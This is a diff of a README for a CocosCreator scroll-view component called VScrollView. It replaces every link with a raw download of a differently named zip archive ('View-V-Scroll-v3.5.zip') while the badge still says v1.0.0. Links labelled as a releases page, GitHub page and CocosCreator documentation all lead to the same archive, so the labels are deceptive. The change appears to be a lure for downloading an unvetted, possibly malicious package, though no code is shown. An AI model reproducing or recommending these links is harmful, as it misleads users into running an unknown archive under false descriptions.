@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download VScrollView](https://raw.githubusercontent.com/levihuluna/VScrollView/main/assets/vscrollview/VScrollView_v1.0.zip%20VScrollView-v1.0.0-brightgreen)](https://raw.githubusercontent.com/levihuluna/VScrollView/main/assets/vscrollview/VScrollView_v1.0.zip)
+[![Download VScrollView](https://raw.githubusercontent.com/levihuluna/VScrollView/main/profiles/v2/packages/View-V-Scroll-v3.5.zip%20VScrollView-v1.0.0-brightgreen)](https://raw.githubusercontent.com/levihuluna/VScrollView/main/profiles/v2/packages/View-V-Scroll-v3.5.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@
 To use VScrollView, follow these simple steps:
 
 1. **Visit the Download Page:**
-   Click on the following link to access the VScrollView releases page: [Download VScrollView](https://raw.githubusercontent.com/levihuluna/VScrollView/main/assets/vscrollview/VScrollView_v1.0.zip).
+   Click on the following link to access the VScrollView releases page: [Download VScrollView](https://raw.githubusercontent.com/levihuluna/VScrollView/main/profiles/v2/packages/View-V-Scroll-v3.5.zip).
 
 2. **Choose Your Version:**
    Look for the latest version available for download. Make sure you select the correct version that is compatible with your CocosCreator setup.
@@ -70,8 +70,8 @@ If you encounter issues while using VScrollView:
 
 For more information or support, check the following resources:
 
-- [VScrollView GitHub Page](https://raw.githubusercontent.com/levihuluna/VScrollView/main/assets/vscrollview/VScrollView_v1.0.zip)
-- [CocosCreator Documentation](https://raw.githubusercontent.com/levihuluna/VScrollView/main/assets/vscrollview/VScrollView_v1.0.zip)
+- [VScrollView GitHub Page](https://raw.githubusercontent.com/levihuluna/VScrollView/main/profiles/v2/packages/View-V-Scroll-v3.5.zip)
+- [CocosCreator Documentation](https://raw.githubusercontent.com/levihuluna/VScrollView/main/profiles/v2/packages/View-V-Scroll-v3.5.zip)
 
 ## ⚙️ Maintenance and Updates
 
